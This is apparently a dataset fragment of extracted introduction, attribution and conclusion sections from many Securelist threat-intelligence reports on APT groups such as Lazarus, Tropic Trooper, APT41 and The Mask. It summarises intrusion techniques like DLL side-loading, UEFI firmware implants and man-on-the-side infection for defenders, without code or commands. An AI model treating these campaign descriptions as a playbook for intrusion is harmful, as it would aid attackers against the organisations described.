\nDangerousObject.Multi.Generic \nIn order to share insight into Cyber Command's highlighted malware and its context, some of our private report's content will be re-written here. The January 2017 report followed up on other private reports published on the group's BeEF-related activity in 2015 and 2016. All of them cover a thread of mid-2015 activity continuing into 2016, then resetting and advancing in 2016 and into 2017. Bear in mind that regardless of current leaks, which do not always present exhaustive information on group participants, activity from the region has had multiple overlaps and presents a confusion of internal dynamics... ", "source": "securelist"}, {"title": "Conclusion", "content": "Previous reports on the NewsBeef APT noted the group's reliance on open-source tools to launch simple, yet effective attacks. Historically, the group has used BeEF to track targets and deliver malicious payloads. However, as this recent campaign indicates, the NewsBeef APT appears to have shifted its intrusion toolset away from BeEF and towards macro-enabled malicious Office documents, PowerSploit, and Pupy. Despite this shift in toolset, the group still relies on old infrastructure as evidenced by their reuse of servers hosted by the service providers Choopa and Atlantic.net. \nThe improvements in tactics, techniques and procedures appears to have paid off. The most recent campaign indicates that the group was able to compromise a larger number of sites including valuable, high-profile SA government identities. However, despite these improvements in technology, the NewsBeef APT continues to rely on social engineering schemes and open-source tools \u2013 attributes that increase the chances of identification. \nNewsBeef attacks against Saudi Arabian organizations and individuals (as well as targets in the European Union) are likely to continue. Additionally, researchers expect that as the group evolves, its tasking will expand to other organizations doing business with, or connected to Saudi Arabian organizations and individuals. \nDue to the group's specific target set, it is crucial that SA security teams, administrators, and developers (especially web application administrators/developers) update their WordPress, Joomla, and Drupal-based web applications and plugins \u2013 as these assets are actively scanned and exploited by this APT. ", "source": "securelist"}, {"title": "Introduction", "content": "Tropic Trooper (also known as KeyBoy and Pirate Panda) is an APT group active since 2011. This group has traditionally targeted sectors such as government, healthcare, transportation and high-tech industries in Taiwan, the Philippines and Hong Kong. Our recent investigation has revealed that in 2024 they conducted persistent campaigns targeting a government entity in the Middle East, starting in June 2023. \nSighting this group's TTPs in critical governmental entities in the Middle East, particularly those related to human rights studies, marks a new strategic move for them. This can help the threat intelligence community better understand the motives of this threat actor. \nThe infection came to our attention in June 2024, when our telemetry gave recurring alerts for a new China Chopper web shell variant (used by many Chinese-speaking actors), which was found on a public web server. The server was hosting an open-source content management system (CMS) called Umbraco, written in C#. The observed web shell component was compiled as a .NET module of Umbraco CMS. \nIn our subsequent investigation, we looked for more suspicious detections on this public server and identified multiple malware sets. These include post-exploitation tools, which, we assess with medium confidence, are related to and leveraged in this intrusion. \nFurthermore, we identified new DLL search-order hijacking implants that are loaded from a legitimate vulnerable executable as it lacks the full path specification to the DLL it needs. This attack chain was attempting to load the Crowdoor loader, which is half-named after the SparrowDoor backdoor, detailed by ESET. During the attack, the security agent blocked the first Crowdoor loader, prompting the attackers to switch to a new, previously unreported variant, with almost the same impact. \nWe attribute this activity to the Chinese-speaking threat actor known as Tropic Trooper with high confidence. Our findings reveal an overlap in the techniques reported in recent Tropic Trooper campaigns. The samples we found also show a high overlap with samples previously attributed to Tropic Trooper. ", "source": "securelist"}, {"title": "Attribution", "content": "Based on the samples found, we are reassessing the relationship between Tropic Trooper and the FamousSparrow group, reported by ESET in 2021. Some industry reports link the two groups together. \nThe following reasons led us to attribute the campaign described in this report and all the observed implants to Tropic Trooper and its associated group, FamousSparrow: \nHardcoded RC4 key: the attackers tried to launch a loader previously attributed to Tropic Trooper (MD5: a213873eb55dc092ddf3adbeb242bd44), after they failed to load it from the a.bat file. They relied on a new method maintaining the same approach by using DLL search-order hijacking and used a new loader. Both samples share the same RC4 key.   \nPost-exploitation tools: some of the post-exploitation tools the attackers used were seen before in other attacks within the same timeframe of this campaign, in which the victims aligned with the targeted regions and industry verticals targeted by this threat group.   \nThe code similarity between the Middle East intrusion sample and the sample found in the thirdparty malware repository from February 2024 (MD5: c10643b3fb304972c650e593b69faaa1): both were loading Crowdoor into memory. Also, the command-line argument \"2\" found in a variant related to Tropic Trooper samples is very similar to SparrowDoor \"-k\" switch functionality. ", "source": "securelist"}, {"title": "Conclusion", "content": "The event that made us investigate Tropic Trooper was the recurring detection of the China Chopper web shell. Following our investigation into this incident, we found more samples written by Tropic Trooper as well as third-party tools used in the post-exploitation phase. This improved insights into this threat actor's TTPs. Notable is the discrepancy in skill set used in various stages of the attack, as well as the choices made after failure. When the actor became aware that their backdoors were detected, they tried to upload newer samples to evade detection, thereby increasing the risk of their new set of samples being detected in the near future. In the same light, the loader sequence goes to great lengths to avoid detection. However, the usage of publicly available tools such as Fscan for further exploitation of the victim's network again highlights the discrepancy between some relatively advanced parts of their operation and the \"noisier\" parts. \nInvestigating the motives of this threat actor led us to conclude that the significance of this intrusion lies in the sighting of a Chinese-speaking actor targeting a content management platform that published studies on human rights in the Middle East, specifically focusing on the situation around Israel-Hamas conflict. Our analysis of this intrusion revealed that this entire system was the sole target during the attack, indicating a deliberate focus on this specific content. \nA more detailed analysis of this campaign is available to users of our private Threat Intelligence Portal, with another upcoming report on this activity. To learn more about this report, please contact intelreports@kaspersky.com. ", "source": "securelist"}, {"title": "Introduction", "content": "During the first week of October, Kaspersky took part in the 34th Virus Bulletin International Conference, one of the longest-running cybersecurity events. There, our researchers delivered multiple presentations, and one of our talks focused on newly observed activities by the Careto threat actor, which is also known as \"The Mask\". You can watch the recording of this presentation here: \nThe Mask APT is a legendary threat actor that has been performing highly sophisticated attacks since at least 2007. Their targets are usually high-profile organizations, such as governments, diplomatic entities and research institutions. To infect them, The Mask uses complex implants, often delivered through zero-day exploits. The last time we published our findings about The Mask was in early 2014, and since then, we have been unable to discover any further traces of this actor. ", "source": "securelist"}, {"title": "Attribution", "content": "As mentioned above, we attribute the previously described attacks to The Mask with medium to high confidence. One of the first attribution clues that caught our attention was several file names used by the malware since 2019, alarmingly similar to the ones used by The Mask more than 10 years ago: \nThe brute-forced DLL names of Careto2 plugins also turned out to resemble the names of plugins used by The Mask in 2007\u20132013: \nFinally, the campaigns conducted in 2007\u20132013 and 2019 have multiple overlaps in terms of TTPs, for instance the use of virtual file systems for storing plugins and leveraging of COM hijacking for persistence. \nRegarding the attacks observed in 2022 and 2024, we have also attributed these to The Mask, mainly for the following reasons: \nThe organization in Latin America, infected in 2022, was the one compromised by Careto2 in 2019, and by historical The Mask implants in 2007-2013   \nIn both 2019 and 2022 cases, the same unique file name was used to deploy implants to infected machines: \\~dfae01202c5f0dba42.cmd;   \nThe attacks from 2019 and 2022\u20132024 overlap in terms of TTPs, as the malware deployed in these attacks uses cloud storages for exfiltration and propagates across system processes. ", "source": "securelist"}, {"title": "Conclusion", "content": "Ten years after we last saw Careto cyberattacks, this actor is still as powerful as before. That is because Careto is capable of inventing extraordinary infection techniques, such as persistence through the MDaemon email server or implant loading though the HitmanPro Alert driver, as well as developing complex multi-component malware. While we cannot estimate how long it will take for the community to discover the next attacks by this actor, we are confident that their next campaign will be as sophisticated as the previous ones. \nIf you want more technical information about Careto, please feel free to also read the research paperon this actor, published in Proceedings of the 34th Virus Bulletin International Conference ", "source": "securelist"}, {"title": "Introduction", "content": "The Lazarus group is currently one of the most active and prolific APT actors. In 2018, Kaspersky published a report on one of their campaigns, named Operation AppleJeus. Notably, this operation marked the first time Lazarus had targeted macOS users, with the group inventing a fake company in order to deliver their manipulated application and exploit the high level of trust among potential victims. As a result of our ongoing efforts, we identified significant changes to the group's attack methodology. To attack macOS users, the Lazarus group has developed homemade macOS malware, and added an authentication mechanism to deliver the next stage payload very carefully, as well as loading the next-stage payload without touching the disk. In addition, to attack Windows users, they have elaborated a multi-stage infection procedure, and significantly changed the final payload. We assess that the Lazarus group has been more careful in its attacks following the release of Operation AppleJeus and they have employed a number of methods to avoid being detected. \nFor more information, please contact: intelreports@kaspersky.com ", "source": "securelist"}, {"title": "Conclusion", "content": "We were able to identify several victims in this Operation AppleJeus sequel. Victims were recorded in the UK, Poland, Russia and China. Moreover, we were able to confirm that several of the victims are linked to cryptocurrency business entities. \nThe actor altered their macOS and Windows malware considerably, adding an authentication mechanism in the macOS downloader and changing the macOS development framework. The binary infection procedure in the Windows system differed from the previous case. They also changed the final Windows payload significantly from the well-known Fallchill malware used in the previous attack. We believe the Lazarus group's continuous attacks for financial gain are unlikely to stop anytime soon. \nSince the initial appearance of Operation AppleJeus, we can see that over time the authors have changed their modus operandi considerably. We assume this kind of attack on cryptocurrency businesses will continue and become more sophisticated. ", "source": "securelist"}, {"title": "Introduction", "content": "Cybercriminals use a variety of bots to conduct DDoS attacks on Internet servers. One of the most popular tools is called Black Energy. To date, Kaspersky Lab has identified and implemented detection for over 4,000 modifications of this malicious program. In mid-2008 malware writers made significant modifications to the original version, creating Black Energy 2 (which Kaspersky Lab detects as Backdoor.Win32.Blakken). This malicious program is the subject of this article. ", "source": "securelist"}, {"title": "Conclusion", "content": "Initially, the Black Energy bot was created with the aim of conducting DDoS attacks, but with the implementation of plugins in the bot's second version, the potential of this malware family has become virtually unlimited. (However, so far cybercriminals have mostly used it as a DDoS tool). Plugins can be installed, e.g. to send spam, grab user credentials, set up a proxy server etc. The upd command can be used to update the bot, e.g. with a version that has been encrypted using a different encryption method. Regular updates make it possible for the bot to evade a number of antivirus products, any of which might be installed on the infected computer, for a long time. \nThis malicious tool has high potential, which naturally makes it quite a threat. Luckily, since there are no publicly available constructors online which can be used online to build Black Energy 2 bots, there are fewer variants of this malware than say, ZeuS or the first version of Black Energy. However, the data we have shows that cybercriminals have already used Black Energy 2 to construct large botnets, and these have already been involved in successful DDoS attacks. \nIt is difficult to predict how botnet masters will use their botnets in the future. It's not hard for malware writers to create a plug-in and get it downloaded to infected user machines. Furthermore, any plug-in code is only present in an infected computer's memory; in all other instances the malicious modules are encrypted, whether this is during transmission or when stored on a hard drive. \nIn addition, Black Energy 2 plugins are not executable (.exe) files. Plugins are loaded directly onto an infected machine, which means that they will not be distributed using mass propagation techniques and antivirus vendors may not come across new plugins for extended periods of time. However, it is the plug-ins that ultimately meet the cybercriminals' goal, i.e. delivering the malicious payload which is the ultimate aim of infecting victim machines with the Black Energy 2 bot. ", "source": "securelist"}, {"title": "Introduction", "content": "LuoYu is a lesser-known threat actor that has been active since 2008. It primarily goes after targets located in China, such as foreign diplomatic organizations established in the country, members of the academic community, or companies from the defense, logistics and telecommunications sectors. In their initial disclosures on this threat actor, TeamT5 identified three malware families: SpyDealer, Demsty and WinDealer. The actor behind these families is capable of targeting Windows, Linux and macOS machines, as well as Android devices. \nIn previous years, Kaspersky investigated LuoYu's activities and was able to confirm the connection between Demsty and WinDealer. On January 27, we delivered a joint presentation with TeamT5 and ITOCHU Corporation at Japan Security Analyst Conference (JSAC) to provide an update on the actor's latest activities. In this article, we will focus on one of the most groundbreaking developments: the fact that LuoYu has the ability to perform man-on-the-side attacks. ", "source": "securelist"}, {"title": "Conclusion", "content": "With this report, we recognize LuoYu as an extremely sophisticated threat actor able to leverage capabilities available only to the most mature attackers. We can only speculate as to how they were able to obtain such capabilities. They could have compromised routers on the route to (or inside) AS4134. Alternatively, they may use signals intelligence methods unknown to the general public. They may even have access (legitimate or fraudulent) to law enforcement tools set up at the ISP level and are abusing them to perform offensive operations. Overall, a threat actor is leveraging capabilities that could be compared (but are distinct) from the QUANTUMINSERT program in order to infect targets located in China. \nMan-on-the-side attacks are devastating because they do not require any interaction with the target to lead to a successful infection: simply having a machine connected to the internet is enough. They can only be detected through careful network monitoring, which is outside of the realm of everyday users, or if an endpoint security program catches the payload when it is deployed on the attacked computer. \nWhatever the case, the only way for potential targets to defend against such intrusions is to remain extremely vigilant and have robust security procedures involving regular antivirus scans, analysis of outbound network traffic and extensive logging to detect anomalies. ", "source": "securelist"}, {"title": "Introduction", "content": "Targeted attack attribution is always a tricky thing, and in general, we believe that attribution is best left to law enforcement agencies. The reason is that, while in $90\\%$ of cases it is possible to understand a few things about the attackers, such as their native language or even location, the remaining $10\\%$ can lead to embarrassing attribution errors or worse. High-profile actors make every effort to stay undetected inside the victim's infrastructure and to leave as few traces as they can. They implement a variety of techniques to make investigation of their campaigns more difficult. Using LOLBINS, common legitimate pentesting tools, and fileless malware; misleading security researchers by placing false flags -these and other anti-forensic tricks often make threat attribution a matter of luck. That is why there is always a percentage of targeted attacks that remain unattributed for years. Recently, I shared my TOP 10 list of the most mysterious APT campaigns/tools on Twitter. In this article, I provide a bit more detail on each case. ", "source": "securelist"}, {"title": "Conclusion", "content": "Advanced threat actors use every possible means to stay undetected, and-if caught-unattributed. Every now and then, security researchers will reveal a mysterious campaign that has remained uncovered for years and that is nearly impossible to trace back to its benefactors with certitude. The ten stories described in this post are just some of the many unattributed mysteries we have seen through the years. That is why it is important to discuss them and share data on them within the cybersecurity community. ", "source": "securelist"}, {"title": "Introduction", "content": "At the end of 2021, we were made aware of a UEFI firmware-level compromise through logs from our Firmware Scanner, which has been integrated into Kaspersky products since the beginning of 2019. Further analysis has shown that a single component within the inspected firmware's image was modified by attackers in a way that allowed them to intercept the original execution flow of the machine's boot sequence and introduce a sophisticated infection chain. \nBy examining the components of the rogue firmware and other malicious artefacts from the target's network, we were able to reach the following conclusions: \nThe inspected UEFI firmware was tampered with to embed a malicious code that we dub MoonBounce; \nDue to its emplacement on SPI flash which is located on the motherboard instead of the hard disk, the implant is capable of persisting in the system across disk formatting or replacement;   \n$\\bullet$ The purpose of the implant is to facilitate the deployment of user-mode malware that stages execution of further payloads downloaded from the internet; The infection chain itself does not leave any traces on the hard drive, as its components operate in memory only, thus facilitating a fileless attack with a small footprint;   \nWe detected other non-UEFI implants in the targeted network that communicated with the same infrastructure which hosted the the stager's payload;   \nBy assessing the combination of the above findings with network infrastructure fingerprints and other TTPs exhibited by the the attackers; to the best of our knowledge the intrusion set in question can be attributed to APT41, a threat actor that's been widely reported to be Chinesespeaking; \nIn this report we describe in detail how the MoonBounce implant works, how it is connected to APT41, and what other traces of activity related to Chinese-speaking actors we were able to observe in the compromised network that could indicate a connection to this threat actor and the underlying campaign. ", "source": "securelist"}, {"title": "Conclusion", "content": "In September 2020, the US Department of Justice released a series of indictments against members of the APT41 group, charging them with a high number of computer intrusions against a variety of targets, both in the private and public sectors, some of which included high-profile supply chain attacks. The intrusion set described in this report, and in other public accounts we referred to, shows that the group did not cease to be active despite these legal proceedings. \nMoreover, it is evident that the group maintains a high level of proficiency and sophistication in the development of its toolset, gaining a foothold in new areas like UEFI firmware. In this sense, the group has introduced its own innovation to this landscape \u2013 patching an existing benign core component in the firmware (rather than adding a new driver to it), thereby turning the UEFI firmware into a highly stealthy and persistent storage for malware in the system. \nFollowing previous predictions, we can now say that UEFI threats are gradually becoming a norm. With this in mind, vendors are taking more precautions to mitigate attacks like MoonBounce, for example by enabling Secure Boot by default. We assess that, in this ongoing arms race, attacks against UEFI will continue to proliferate, with attackers evolving and finding ways to exploit and bypass current security measures. \nAs a safety measure against this attack and similar ones, it is recommended to update the UEFI firmware regularly and verify that BootGuard, where applicable, is enabled. Likewise, enabling Trust Platform Modules, in case a corresponding hardware is supported on the machine, is also advisable. On top of all, a security product that has visibility into the firmware images should add an extra layer of security, alerting the user on a potential compromise if such occurs. ", "source": "securelist"}, {"title": "Introduction", "content": "UPD 23.04.2025: MITRE created a page for Operation Triangulation as part of its ATT&CK framework. \nIn the beginning of 2023, thanks to our Kaspersky Unified Monitoring and Analysis Platform (KUMA) SIEM system, we noticed suspicious network activity that turned out to be an ongoing attack targeting the iPhones and iPads of our colleagues. The moment we understood that there was a clear pattern in the connections, and that the devices could have been infected, we initiated a standard digital forensics and incident response (DFIR) protocol for such cases \u2013 moving around the office, collecting the devices, and inspecting their contents. The ultimate goal was to locate and extract the malware, to find the point of entry (hopefully, a 0-day) and to develop a protocol for scanning the iDevices for active infection. That process turned into a months-long journey, and in this article we ", "source": "securelist"}, {"title": "Conclusion", "content": "Our journey of investigating Operation Triangulation was quite lengthy; it took several months. Despite many ups and downs, we eventually managed to obtain all the stages used in this attack, including four zero-day exploits reported to Apple, two validators, an implant and its modules. \nAlong the way, we conducted a lot of research on iOS internals and came up with many interesting techniques, such as the one we used for extracting the iMessage attachment. \nThe main difficulty that we encountered during our research was to deal with the public-key cryptography that was used in just about every stage of the infection chain. To bypass the encryption, we had to develop a mitmproxy add-on that patched the malicious stages on the fly and compromised the original algorithms. Initially, we started with just 30 lines of code. When we finished extracting the modules, it had about 400 lines \u2013 and we definitely did not expect the add-on's code to grow that much back at the start of our enduring adventure! ", "source": "securelist"}, {"title": "Introduction", "content": "Over the past few years, the Lazarus group has been distributing its malicious software by exploiting fake job opportunities targeting employees in various industries, including defense, aerospace, cryptocurrency, and other global sectors. This attack campaign is called the DeathNote campaign and is also referred to as \"Operation DreamJob\". We have previously published the history of this campaign. \nRecently, we observed a similar attack in which the Lazarus group delivered archive files containing malicious files to at least two employees associated with the same nuclear-related organization over the course of one month. After looking into the attack, we were able to uncover a complex infection chain that included multiple types of malware, such as a downloader, loader, and backdoor, demonstrating the group's evolved delivery and improved persistence methods. \nIn this blog, we provide an overview of the significant changes in their infection chain and show how they combined the use of new and old malware samples to tailor their attacks. ", "source": "securelist"}, {"title": "Conclusion", "content": "Throughout its history, the Lazarus group has used only a small number of modular malware frameworks such as Mata and Gopuram Loader. Introducing this type of malware is an unusual strategy for them. The fact that they do introduce new modular malware, such as CookiePlus, suggests that the group is constantly working to improve their arsenal and infection chains to evade detection by security products. \nThe problem for defenders is that CookiePlus can behave just like a downloader. This makes it difficult to investigate whether CookiePlus downloaded just a small plugin or the next meaningful payload. From our analysis, it appears to be still under active development, meaning Lazarus may add more plugins in the future. ", "source": "securelist"}, {"title": "Introduction", "content": "We introduced Tomiris to the world in September 2021, following our investigation of a DNS-hijack against a government organization in the Commonwealth of Independent States (CIS). Our initial report described links between a Tomiris Golang implant and SUNSHUTTLE (which has been associated to NOBELIUM/APT29/TheDukes) as well as Kazuar (which has been associated to Turla); however, interpreting these connections proved difficult. \nWe continued to track Tomiris as a separate threat actor over three new attack campaigns between 2021 and 2023, and our telemetry allowed us to shed light on the group. In this blog post, we're excited to share what we now know of Tomiris with the broader community, and discuss further evidence of a possible connection to Turla. ", "source": "securelist"}, {"title": "Conclusion", "content": "With this report, we hope to alert the community to the dangers of using KopiLuwak and TunnusSched to link cyberattacks to Turla. To the best of our knowledge, this toolset is currently shared between Tomiris and Turla and we cannot rule out that more actors outside our purview have access to it. We expect the attribution of this cluster of activities to remain unclear for the near future. \nIn the grander scheme of things, this investigation reveals the pitfalls that the information security industry faces when working on cyberattacks. We rely on a knowledge pool generously shared among all participants, yet information decays: what is true today may turn out to be wrong tomorrow. Discovering new, reliable data isn't enough; existing assumptions also need to be substantiated \u2013 which can only happen when vendors publish data. In that spirit, we kindly thank Mandiant for the research they published. \nFinally, this investigation illustrates the limits of technical attribution. Looking at infections and malware samples only gets us so far and we are often reminded that APT groups are subject to organizational and political constraints. On rare occasions, we stumble upon a piece of the puzzle that allows us to pierce the veil. \nAs for the Tomiris mystery, we'll be eagerly awaiting the next piece. ", "source": "securelist"}, {"title": "Introduction", "content": "State-sponsored threat actors and sophisticated attacks are often in the spotlight. Indeed, their innovative techniques, advanced malware platforms and 0-day exploit chains capture our collective imagination. Yet these groups still aren't likely to be a part of the risk model at most companies, nor should they be. Businesses today are faced with an array of much more immediate threats, from ransomware and customer information leaks, to competitors engaging in unethical business practices. In this blog post, we'll be focusing on DeathStalker: a unique threat group that appears to target law firms and companies in the financial sector (although we've occasionally seen them in other verticals as well). As far as we can tell, this actor isn't motivated by financial gain. They don't deploy ransomware, steal payment information to resell it, or engage in any type of activity commonly associated with the cybercrime underworld. Their interest in gathering sensitive business information leads us to believe that DeathStalker is a group of mercenaries offering hacking-for-hire services, or acting as some sort of information broker in financial circles. \nDeathStalker first came to our attention through a PowerShell-based implant called Powersing. By unraveling this thread, we were able to identify activities dating back to 2018, and possibly even 2012. But before we dive into a history of DeathStalker and possible links to known groups, we'll start with a bit of background, beginning with this actor's current arsenal. ", "source": "securelist"}, {"title": "Conclusion", "content": "In this blog post, we described a modern infection chain that's still actively used and developed by a threat actor today. It doesn't contain any innovative tricks or sophisticated methods, and certain components of the chain may actually appear needlessly convoluted. Yet if the hypothesis is correct that the same group operates Janicab and Powersing, it indicates that they've been leveraging the same methodologies since 2012. In the infosec world, it doesn't get more \"tried and true\" than this. \nBased on the limited technological means either of these toolchains display, we believe they're good examples of what small groups or even skilled individuals can create. The value we see in publicly releasing information about DeathStalker is to have this threat actor serve as a baseline of what the private sector should be able to defend against. Groups like DeathStalker represent the type of cyberthreat most companies today are likely to face more than state-sponsored APTs. Due to its ongoing operations (DeathStalker notably leveraged COVID-19 for both Janicab and Powersing implant deployment since March 2020) and continuous activity since 2018, we believe that DeathStalker is still developing its toolset, and that we'll have more to report on in the near future. \nWe advise defenders to pay close attention to any process creation related to native Windows interpreters for scripting languages, such as powershell.exe and cscript.exe. Wherever possible, these utilities should be made unavailable. We also recommend that future awareness trainings and security product assessments include infection chains based on LNK files. \nFor more information about both DeathStalker and Evilnum activity, subscribe to our private reporting services: intelreports@kaspersky.com ", "source": "securelist"}, {"title": "Introduction", "content": "We have been tracking the latest attack campaign by the Lazarus group since last November, as it targeted organizations in South Korea with a sophisticated combination of a watering hole strategy and vulnerability exploitation within South Korean software. The campaign, dubbed \"Operation SyncHole\", has impacted at least six organizations in South Korea's software, IT, financial, semiconductor manufacturing, and telecommunications industries, and we are confident that many more companies have actually been compromised. We immediately took action by communicating meaningful information to the Korea Internet & Security Agency (KrCERT/CC) for rapid action upon detection, and we have now confirmed that the software exploited in this campaign has all been updated to patched versions. ", "source": "securelist"}, {"title": "Attribution", "content": "Throughout this campaign, several malware samples were used that we managed to attribute to the Lazarus group through our ongoing and dedicated research conducted for a long time. Our attribution is supported by the historical use of the malware strains, as well as their TTPs, all of which have been well documented by numerous security solutions vendors and governments. Furthermore, we have analyzed the execution time of the Windows commands delivered by the COPPERHEDGE malware, the build timestamps of all malicious samples we described above, and the time of initial compromise per host, demonstrating that the timeframes were mostly concentrated between GMT 00:00 and 09:00. Based on our knowledge of normal working hours in various time zones, we can infer that the actor is located in the GMT $+09$ time zone. ", "source": "securelist"}, {"title": "Victims", "content": "We identified at least six software, IT, financial, semiconductor manufacturing and telecommunication organizations in South Korea that fell victim to \"Operation SyncHole\". However, we are confident that there are many more affected organizations across a broader range of industries, given the popularity of the software exploited by Lazarus in this campaign. ", "source": "securelist"}, {"title": "Conclusion", "content": "This is not the first time that the Lazarus group exploited supply chains with a full understanding of the software ecosystem in South Korea. We have already described similar attacks in our analysis reports on the Bookcode cluster in 2020, the DeathNote cluster in 2022, and the SIGNBT malware in 2023. All of these cases targeted software developed by South Korean vendors that required installation for online banking and government services. Both of the software products exploited in this case are in line with past cases, meaning that the Lazarus group is endlessly adopting an effective strategy based on cascading supply chain attacks. \nThe Lazarus group's specialized attacks targeting supply chains in South Korea are expected to continue in the future. Our research over the past few years provided evidence that many software development vendors in Korea have already been attacked, and if the source code of a product has been compromised, other zero-day vulnerabilities may continue to be discovered. The attackers are also making efforts to minimize detection by developing new malware or enhancing existing malware. In particular, they introduce enhancements to the communication with the C2, command structure, and the way they send and receive data. \nWe have proven that accurate detection and quick response can effectively deter their tactics, and in the meantime, we were able to remediate vulnerabilities and mitigate attacks to minimize damage. We will continue to monitor the activity of this group and remain agile in responding to their changes. We also recommend using reliable security solutions to stay alert and mitigate potential risks. Our product line for businesses helps identify and prevent attacks of any complexity at an early stage. \nKaspersky products detect the exploits and malware used in this attack with the following verdicts: Trojan.Win64.Lazarus.\\* , Trojan.Win32.Lazarus.\\* , MEM:Trojan.Win32.Cometer.gen , MEM:Trojan.Win32.SEPEH.gen , Trojan.Win32.Manuscrypt.\\* , Trojan.Win64.Manuscrypt.\\* , Trojan.Win32.Zenpak.\\* . ", "source": "securelist"}, {"title": "Introduction", "content": "17 FEB 2015 minute read \nAt the Virus Bulletin conference in 2010, researchers from Kaspersky Lab partnered with Microsoft to present findings related to Stuxnet. The joint presentation included slides dealing with various parts of Stuxnet, such as the zero-days used in the attack. \nPerhaps the most interesting zero-day exploit from Stuxnet was the LNK exploit (CVE-2010-2568). This allowed Stuxnet to propagate through USB drives and infect even machines that had Autorun disabled. \nIt was discovered during the 2010 research into Stuxnet that the LNK exploit has earlier been used in another malware, supposedly a Zlob PE, that pointed to \"fanny.bmp\". \nBack in 2010, very few people paid much attention to a piece of malware that used the LNK exploit prior to Stuxnet. Zlob is a large malware family and these kinds of crimeware-grade samples are rarely of interest to researchers digging into zero-days and nation-state sponsored operations. \nHowever, during our 2014 research into the Equation group, we created a special detection for the group's exploitation library, codenamed \"PrivLib\". To our surprise, this detection triggered a worm from 2008 that used the Stuxnet LNK exploit to replicate, codenamed Fanny. ", "source": "securelist"}, {"title": "Conclusion", "content": "With Fanny, we begin yet another chapter in the story of Stuxnet, the Equation Group and Flame. Created in 2008, Fanny used two zero-day exploits. These two were added to Stuxnet in June 2009 and March 2010. Effectively, it means that the Equation group had access to these zero-days (and others) years before the Stuxnet group did. \nWhile the true target of Fanny remains unknown, its unique capability to map air-gapped networks and communicate via USB sticks indicate a lot of work went into gaining the ability to access these airgapped networks. As a precursor for the versions of Stuxnet that could replicate through the network, it's possible that Fanny was used to map some of the future targets of Stuxnet. \nAnother unusual fact is the very high number of infections coming from Pakistan. Since Fanny spreads only through USB sticks, which is rather slow, this indicates that the infection began in Pakistan, possibly before many other countries. \nWas Fanny used to map some highly sensitive networks in Pakistan, for an unknown purpose, or was it used in preparation for Stuxnet? Perhaps time will tell. \nYour email address will not be published. Required fields are marked \\* ", "source": "securelist"}, {"title": "Introduction", "content": "In the nebula of Chinese-speaking threat actors, it is quite common to see tools and methodologies being shared. One such example of this is the infamous \"DLL side-loading triad\": a legitimate executable, a malicious DLL to be sideloaded by it, and an encoded payload, generally dropped from a self-extracting archive. Initially considered to be the signature of LuckyMouse, we observed other groups starting to use similar \"triads\" such as HoneyMyte. While it implies that it is not possible to attribute attacks based on this technique alone, it also follows that efficient detection of such triads reveals more and more malicious activity. \nThe investigation described in this article started with one such file which caught our attention due to the various improvements it brought to this well-known infection vector. ", "source": "securelist"}, {"title": "Attribution", "content": "We observed this campaign between June 2020 and January 2021. According to our telemetry, dozens of organizations were affected. $80\\%$ of them are based in Vietnam and belong to the government or military sector, or are otherwise related to the health, diplomacy, education or political verticals. We also identified occasional targets in Central Asia and in Thailand. \nFor the reasons laid-out in the introduction, attribution based on tooling alone is risky when it comes to this nebula. At first glance, the use of a \"triad\", the general design philosophy and the obvious effort spent to make reverse-engineering as complex as possible are reminiscent of LuckyMouse. However, we also observed code similarities between CoreLoader or FoundCore and programs associated with the Cycldek threat actor \u2013 namely, RedCore Loader (MD5: 1B6BCBB38921CAF347DF0A21955771A6). \nWhile Cycldek was, so far, considered to be one of the lesser sophisticated threat actors from the Chinese-speaking nexus, its targeting is known to be consistent with what we observed in this campaign. Therefore, we are linking the activities described in this post with Cycldek with low confidence. ", "source": "securelist"}, {"title": "Conclusion", "content": "No matter which group orchestrated this campaign, it constitutes a significant step up in terms of sophistication. The toolchain presented here was willfully split into a series of interdependent components that function together as a whole. Single pieces are difficult \u2013 sometimes impossible \u2013 to analyze in isolation, because they rely on code or data provided at other stages of the infection chain. We regretfully admit that this strategy was partly successful in preventing us from obtaining a complete picture of this campaign. As such, this report is as much about the things we know as it is about figuring out what we don't. We hereby extend our hand to fellow researchers who might be seeing other pieces of this vast puzzle, because we strongly believe that the challenges ahead of us can only be overcome through information sharing among trusted industry partners. \nSome readers from other regions of the world might dismiss this local activity as irrelevant to their interests. We would advise them to take heed. Experience shows that regional threat actors sometimes widen their area of activity as their operational capabilities increase, and that tactics or tools are vastly shared across distinct actors or intrusion-sets that target different regions. Today, we see a group focused on South-East Asia taking a major leap forward. Tomorrow, they may decide they're ready to take on the whole world. ", "source": "securelist"}, {"title": "Introduction", "content": "On October 4, 2018, the MIVD held a press conference about an intercepted cyberattack on the OPCW in the Netherlands, allegedly by the advanced threat actor Sofacy (also known as APT28 or Fancy Bear, among others). According to the MIVD, four suspects were caught red handed trying to break into the OPWC's network. Sofacy activity in the Netherlands did not come as a surprise to us, since we have seen signs of its presence in that country before. However, aside from Sofacy we haven't seen many other advanced persistent threat (APT) groups in the Netherlands, at least when compared to other areas, such as the Middle-East. Upon further reflection, we have concluded that this is rather odd. There are quite a few big multinationals and some high tech companies located in the Netherlands. In addition, there are other potential strategic targets for threat actors. So we decided to review cyber-threat activity targeting or affecting the Netherlands. \nProviding an overview of one APT's activity can be quite difficult, let alone all the APT activity affecting a country. First, we only see what we can see. That means we can only gather data from sources we have access to, such as that shared voluntarily by our customers with Kaspersky Security Network (KSN), and those sources also need to be supplied with data related to a specific APT. As a result, like any other cybersecurity vendor, our telemetry is naturally incomplete. \nOne way to improve our overview is to use sinkhole data. When a domain that is used by an APT expires, researchers can register that domain and direct the traffic to a sinkhole server. This is done quite frequently. For many of the APTs we track, we sinkhole at least one domain. In comparison to other sources, such as KSN and multi-scanner services, sinkhole data has a number of advantages. For example, in some cases you can get a better overview of the victimology of the APT. The drawback is that we need to filter the results, since there can be quite a few false positives (e.g. because other researchers are investigating the malware). This filtering can be quite cumbersome, because if we base it solely on the IP and the requests, it is quite difficult to come to a verdict. ", "source": "securelist"}, {"title": "Conclusion", "content": "Although our visibility of threat actor activity in the Netherlands is incomplete, the results are nevertheless surprising. Some groups we did not expect to see appear to be active in the country (such as the Lamberts). However, upon further thought, and especially when looking at potential targets located in the Netherlands and comparing this with the interests of some of the APT groups, their activity in the Netherlands makes sense. \nThe presence of both expected and unexpected threat actors is a good argument for organizations staying informed of the latest developments in cyberspace, particularly through threat intelligence reports. Because if you know what APT groups are up to, which organisations they target and what TTPs they use, you can implement the protection you need to stay one step ahead of them. \nSuch precautions are important, because one of the most stunning findings from the review of sinkhole databases was the number of organizations infected using \"ordinary cybercrime malware\". We saw infections among airlines, airports and other major companies (although it should be 